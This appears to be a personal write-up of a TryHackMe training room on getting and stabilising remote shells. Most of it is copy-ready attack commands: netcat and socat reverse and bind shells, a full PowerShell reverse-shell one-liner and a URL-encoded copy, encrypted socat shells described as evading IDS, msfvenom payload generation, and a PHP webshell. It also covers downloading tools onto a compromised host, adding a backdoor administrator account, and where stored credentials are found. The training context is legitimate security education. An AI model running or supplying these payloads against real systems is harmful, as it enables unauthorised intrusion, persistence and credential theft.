# THM Room: What the Shell? #

## What is a shell? ##

* In the simplest possible term; a shell is what we use to interact with a Command Line Environment or (CLI).
* we can force the remote server to either send us command line access to the server (a reverse shell), or to open up a port on the server which we can connect to in order to execute further commands (a bind shell).
* There are a variety of tools that we will be using to receive reverse shells and to send bind shells.

### Common Shell Payloads ###

A previous task mentioned that we'd be looking at some ways to use netcat as a listener for a bindshell, so we'll start with that. In some versions of netcat (including the nc.exe Windows version included with Kali at /usr/share/windows-resources/binaries, and the version used in Kali itself: netcat-traditional) there is a `-e` option which allows you to execute a process on connection. For example, as a listener:

```ZSH
nc -lvnp <PORT> -e /bin/bash
```

Connecting to the above listener with netcat would result in a bind shell on the target.

Equally, for a reverse shell, connecting back with `nc <LOCAL-IP> <PORT> -e /bin/bash` would result in a reverse shell on the target.

However, this is not included in most versions of netcat as it is widely seen to be very insecure (funny that, huh?). On Windows where a static binary is nearly always required anyway, this technique will work perfectly. On Linux, however, we would instead use this code to create a listener for a bind shell:

```ZSH
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

The following paragraph is the technical explanation for this command. It's slightly above the level of this room, so don't worry if it doesn't make much sense for now -- the command itself is what matters.

The command first creates a named pipe at `/tmpf`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send)then gets piped directly into sh, sending the `stderr` output stream into stdout, and sending `stdout` itself into the input of the named pipe, thus completing the circle.

![Listener for Bind shell](https://i.imgur.com/se5Fyn3.png)

A very similar command can be used to send a netcat reverse shell:

```ZSH
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax.

---

When targeting a modern Windows Server, it is very common to require a Powershell reverse shell, so we'll be covering the standard one-liner PSH reverse shell here.

* This command is very convoluted, so for the sake of simplicity it will not be explained directly here. It is, however, an extremely useful one-liner to keep on hand:

```zsh
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

In order to use this, we need to replace `"<IP>"` and `"<port>"` with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell:

## Tools ##

1. Netcat
1. Socat
1. Metasploit Framework
1. Msfvenom
1. Metasploit multi/handler

### 1. Netcat ###

* Netcat is the traditional "Swiss Army Knife" of networking. It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, but more importantly for our uses, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by techniques that we will be covering in an upcoming task.

```ZSH
# To start a listener
nc -lvnp <port-number>

# To connect to a 'Target' system
nc <target-ip> <chosen-port>
```

> It's often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.

#### Netcat shell stabilization ####

* Netcat shells are not very stable by default. Pressing `Ctrl + C` kills the whole thing.
* They are non interactive and often have strange formatting issues.
* Fortunately there are many ways to stabilize a shell, and we will discuss three techniques here;

##### Techniques #####

1. Python
2. rlwrap
3. Socat

> Python

1. The first thing to do is use `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
2. Step two is: `export TERM=xterm` -- this will give us access to term commands such as clear.
3. Finally (and most importantly) we will background the shell using `Ctrl + Z`. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab auto completes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

* The full technique can be seen here:
![technique](https://i.imgur.com/bQnFz1T.png)

> rlwrap

1. rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilization must still be utilised if you want to be able to use `Ctrl + C` inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap`.

To use rlwrap, we invoke a slightly different listener:

```ZSH
rlwrap nc -lvnp <port>
```

1. Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with `Ctrl + Z`, then use `stty raw -echo; fg` to stabilise and re-enter the shell.

> Socat

1. The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary `sudo python3 -m http.server 80`, then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget `wget <LOCAL-IP>/socat -O /tmp/socat`.

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`. We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.

### 2. Socat ###

* Socat is like netcat on steroids. It can do all of the same things, and many more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however, there are two big catches:

1. The syntax is more difficult
2. Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.

* There are work arounds to both of these problems, which we will cover later on.
* Both Socat and Netcat have .exe versions for use on Windows.

> More

* Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is as a connector between two points. In the interests of this room, this will essentially be a listening port and the keyboard, however, it could also be a listening port and a file, or indeed, two listening ports. All socat does is provide a link between two points -- much like the portal gun from the Portal games!

> Reverse Shells

* As mentioned previously, the syntax for socat gets a lot harder than that of netcat. Here's the syntax for a basic reverse shell listener in socat:

```ZSH
socat TCP-L:<port> -
```

* As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to `nc -lvnp <port>`.
* On Windows we would use this command to connect back:

```ZSH
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

* The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.
* This is the equivalent command for a Linux Target:

```ZSH
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

> Bind Shells

* On a Linux target we would use the following command:

```ZSH
socat TCP-L:<PORT> EXEC:"bash -li"
```

* On a Windows target we would use this command for our listener:

```ZSH
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

* We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.
* Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.

```ZSH
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

> Setting a Linux tty reverse shell

* Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux, but is significantly more stable. As mentioned earlier, socat is an incredibly versatile tool; however, the following technique is perhaps one of its most useful applications. Here is the new listener syntax:

```ZSH
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

* Let's break this command down into its two parts. As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the `Ctrl + Z`, `stty raw -echo; fg` trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty.
* The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true), which can then be executed as normal.

The special command is as follows:

```ZSH
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

* The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  EXEC:"bash -li". We're also passing the arguments: pty, stderr, sigint, setsid and sane:
* pty, allocates a pseudoterminal on the target -- part of the stabilisation process
* stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
* sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
* setsid, creates the process in a new session
* sane, stabilises the terminal, attempting to "normalise" it.

 let's see it in action.

As normal, on the left we have a listener running on our local attacking machine, on the right we have a simulation of a compromised target, running with a non-interactive shell. Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left:
![socat in action](https://i.imgur.com/etAuYzz.png)

* Note that the socat shell is fully interactive, allowing us to use interactive commands such as SSH. This can then be further improved by setting the stty values as seen in the previous task, which will let us use text editors such as Vim or Nano.
* If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding -d -d into the command. This is very useful for experimental purposes, but is not usually necessary for general use.

#### Socat Encrypted Shells ####

* One the main benefits of socat is that it is capable of creating encrypted shells which can't be spied on unless you have a decryption key, and are often able to bypass IDS systems.
* When working with encrypted shells, we would use `OPENSSL` instead of `TCP`.
* First we are gonna need to generate a certificate in order to use encrypted shells.

This is how to do it on our attacker machine;

```ZSH
openssh req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

This command creates a 2048 bit RSA key with machine cert file, self signed and valid for use for one year.

* When you run this command it will ask you to fill out a form which you can leave blank.

When you need to merge the two created files into a single `.pem` file.

```ZSH
cat shell.key shell.crt > shell.pem
```

* Now when we set our reverse shell we use;

```ZSH
socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 -
```

* This sets up an OPENSSL listener using our generated certificate. verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.

To connect back, we would use:

```ZH
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

The same technique would apply for a bind shell:

Target:

```ZSH
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```

Attacker:

```ZSH
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

* Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.

The following image shows an OPENSSL Reverse shell from a Linux target. As usual, the target is on the right, and the attacker is on the left:

![openssl](https://i.imgur.com/UbOPN9q.png)

### THM-Questions ###

1. What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"

* Answer: `socat openssl-listen:53,cert=encrypt.pem,file:`tty`:verify,raw,echo=0`

1. If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?

* Answer: `socat openssl:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

### 3. Metasploit ###

* The `auxiliary/multi/handler` module of the Metasploit framework is, like socat and netcat, used to receive reverse shells. Due to being part of the Metasploit framework, `multi/handler` provides a fully-fledged way to obtain stable shells, with a wide variety of further options to improve the caught shell. It's also the only way to interact with a meterpreter shell, and is the easiest way to handle staged payloads -- both of which we will look at in task 9.

### 4. Msfvenom ###

> Syntax: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe`

* Like multi/handler, `msfvenom` is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly. Whilst msfvenom can generate payloads other than reverse and bind shells, these are what we will be focusing on in this room. Msfvenom is an incredibly powerful tool, so we will go into its application in much more detail in a dedicated task.

> With any of the above techniques,

* It's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.
* First, open another terminal and run stty -a. This will give you a large stream of output. Note down the values for "rows" and columns:
* Next, in your reverse/bind shell, type in:

```ZSH
stty rows <number>

and

stty cols <number>
```

* Filling in the numbers you got from running the command in your own terminal.
* This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.

---

#### Generating a Payload using Msfvenom ####

Msfvenom: the one-stop-shop for all things payload related.

* Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; however, it can also be used to generate payloads in various formats (e.g. .exe, .aspx, .war, .py).
* The standard syntax for msfvenom is as follows:

`msfvenom -p <PAYLOAD> <OPTIONS>`

For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:

```ZSH
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```

![Generating a payload](https://i.imgur.com/JkWeFLq.png)

Here we are using a payload and four options:

* `-f <format>` Specifies the output format. In this case that is an executable `(exe)`
* `-o <file>` The output location and filename for the generated payload.
* `LHOST=<IP>` Specifies the IP to connect back to.
* `LPORT=<port>` The port on the local machine to connect back to. This can be anything between 0and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.

---

#### Staged vs Stageless Payloads ####

Before we go any further, there are another two concepts which must be introduced: staged reverse shell payloads and stageless reverse shell payloads.

* Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.

* Stageless payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software. Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.

---

#### Meterpreter ####

On the subject of Metasploit, another important thing to discuss is a Meterpreter shell. Meterpreter shells are Metasploit's own brand of fully-featured shell. They are completely stable, making them a very good thing when working with Windows targets. They also have a lot of inbuilt functionality of their own, such as file uploads and downloads. If we want to use any of Metasploit's post-exploitation tools then we need to use a meterpreter shell, however, that is a topic for [another time](https://tryhackme.com/room/rpmetasploit). The downside to meterpreter shells is that they must be caught in Metasploit. They are also banned from certain certification examinations, so it's a good idea to learn alternative methodologies.

---

#### Payload Naming Conventions ####

When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:

* `<OS>/<arch>/<payload>`

For example:

* `linux/x86/shell_reverse_tcp`

This would generate a stageless reverse shell for an `x86 Linux` target.

The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:

* `windows/shell_reverse_tcp`

For a 64bit Windows target, the arch would be specified as normal (x64).

Let's break the payload section down a little further.

In the above examples the payload used was shell_reverse_tcp. This indicates that it was a stageless payload. How? Stageless payloads are denoted with underscores `(_)`. The staged equivalent to this payload would be:

* `shell/reverse_tcp`

As staged payloads are denoted with another forward slash `(/)`.

This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:

* `windows/x64/meterpreter/reverse_tcp`

A Linux 32bit stageless Meterpreter payload would look like this:

* `linux/x86/meterpreter_reverse_tcp`

Aside from the msfconsole man page, the other important thing to note when working with msfvenom is:

* `msfvenom --list payloads`

This can be used to list all available payloads, which can then be piped into grep to search for a specific set of payloads. For example:

![image](https://i.imgur.com/iFO6ydX.png)

This gives us a full set of Linux meterpreter payloads for 32bit targets.

---

### 4. Metasploit multi/handler ###

* Multi/Handler is a superb tool for catching reverse shells. It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.

Fortunately, it's relatively easy to use:

Open Metasploit with msfconsole
Type use multi/handler, and press enter

We are now primed to start a multi/handler session. Let's take a look at the available options using the options command:

There are three options we need to set: payload, LHOST and LPORT. These are all identical to the options we set when generating  shellcode with Msfvenom -- a payload specific to our target, as well as a listening address and port with which we can receive a shell. Note that the LHOST must be specified here, as metasploit will not listen on all network interfaces like netcat or socat will; it must be told a specific address to listen with (when using TryHackMe, this will be your tun0 address). We set these options with the following commands:

```ZSH
* set PAYLOAD <payload>
* set LHOST <listen-address>
* set LPORT <listen-port>
```

We should now be ready to start the listener!

Let's do this by using the exploit -j command. This tells Metasploit to launch the module, running as a job in the background.

You may notice that in the above screenshot, Metasploit is listening on a port under 1024. To do this, Metasploit must be run with sudo permissions.

When the staged payload generated in the previous task is run, Metasploit receives the connection, sending the remainder of the payload and giving us a reverse shell:

Notice that, because the multi/handler was originally backgrounded, we needed to use sessions 1 to foreground it again. This worked as it was the only session running. Had there been other sessions active, we would have needed to use sessions to see all active sessions, then use sessions `<number>` to select the appropriate session to foreground. This number would also have been displayed in the line where the shell was opened (see "Command Shell session 1 opened").

---

#### Webshells ####

There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible. In these cases we would instead upload a webshell. See the [Upload Vulnerabilities Room](https://tryhackme.com/room/uploadvulns) for a more extensive look at this concept.

* "Webshell" is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage -- either through a HTML form, or directly as arguments in the URL -- which are then executed by the script, with the results returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.

As PHP is still the most common server side scripting language, let's have a look at some simple code for this.

In a very basic one line format:

* `<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

This will take a GET parameter in the URL and execute it on the system with shell_exec(). Essentially, what this means is that any commands we enter in the URL after ?cmd= will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page.

Let's see this in action:

![Generating webshell](https://i.imgur.com/W19gHwL.png)

Notice that when navigating the shell, we used a GET parameter "cmd" with the command `"ifconfig"`, which correctly returned the network information of the box. In other words, by entering the ifconfig command (used to check the network interfaces on a Linux target) into the URL of our shell, it was executed on the system, with the results returned to us. This would work for any other command we chose to use (e.g. `whoami`, `hostname`, `arch`, `etc`).

As mentioned previously, there are a variety of webshells available on Kali by default at `/usr/share/webshells` -- including the infamous [PentestMonkey php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) -- a full reverse shell written in PHP. Note that most generic, language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux webservers. They will not work on Windows by default.

When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. With the former method, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell. This would be copied into the URL as the cmd argument:

```powershell
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

This is the same shell we encountered in Task 8, however, it has been URL encoded to be used safely in a GET parameter. Remember that the IP and Port (bold, towards end of the top line) will still need to be changed in the above code.

---

#### After Gaining shell ####

Ok, we have a shell. Now what?

We've covered lots of ways to generate, send and receive shells. The one thing that these all have in common is that they tend to be unstable and non-interactive. Even Unix style shells which are easier to stabilise are not ideal. So, what can we do about this?

On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at `/home/<user>/.ssh` are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like [Dirty C0w](https://dirtycow.ninja/) or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.

On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at

```powershell
 C:\Program Files\FileZilla Server\FileZilla Server.xml
 or C:\xampp\FileZilla Server\FileZilla Server.xml
```

 These can be MD5 hashes or in plaintext, depending on the version.

Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.

The syntax for this is as follows:

`net user <username> <password> /add`

`net localgroup administrators <username> /add`

The important take away from this task:

Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell. Ideally we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.
